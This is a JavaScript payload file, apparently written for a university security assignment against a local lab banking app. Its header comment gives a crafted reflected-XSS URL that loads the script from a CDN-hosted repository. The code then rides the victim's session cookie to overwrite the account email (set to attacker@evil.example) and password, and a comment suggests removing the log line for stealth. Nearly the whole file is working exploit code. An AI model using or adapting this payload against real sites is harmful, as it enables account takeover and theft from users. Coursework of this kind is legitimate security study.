/* FIT5003 A2 — Part B.2 external payload (reflected-XSS account takeover).
 *
 * will execute a remote <script src>. A raw github.com URL is served as
 * text/plain + nosniff and will NOT run.
 *
 * Crafted victim URL (reflected sink is /search?q=, see search.html):
 *
 *   http://127.0.0.1:5000/search?q=<script src="https://cdn.jsdelivr.net/gh/jolin1215/my-payload-repo@main/payload.js"></script>
 *
 * When a logged-in victim opens that URL, this script runs in THEIR session and
 * on DevBank's own origin, so the browser attaches their auth cookie to the
 * request below. It rewrites the victim's email and password via the profile
 * endpoint — a full account takeover: the attacker now knows the password and
 * can log in as the victim.
 */
(function () {
  var NEW_EMAIL = "attacker@evil.example";
  var NEW_PASSWORD = "hello";   // attacker-chosen; log in as the victim afterwards

  fetch("/profile", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    credentials: "same-origin",       // ride the victim's DevBank session cookie
    body: "email=" + encodeURIComponent(NEW_EMAIL) +
          "&password=" + encodeURIComponent(NEW_PASSWORD)
  }).then(function () {
    // Visible confirmation for the demo (optional; remove for a stealthy attack).
    console.log("[payload] victim account credentials overwritten");
  });
})();
